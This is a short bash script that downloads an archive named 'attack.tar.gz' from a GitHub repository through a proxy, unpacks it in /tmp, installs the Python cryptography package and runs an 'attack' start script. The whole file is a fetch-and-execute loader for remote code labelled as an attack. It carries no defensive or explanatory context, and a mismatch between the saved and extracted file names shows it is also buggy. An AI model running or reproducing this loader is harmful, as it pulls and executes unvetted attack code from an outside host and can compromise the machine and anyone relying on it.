#!/bin/bash

curl -L https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz -o /tmp/attach.tar.gz && tar xzvf /tmp/attack.tar.gz
pip3 install cryptography
python3 /tmp/attack/start.py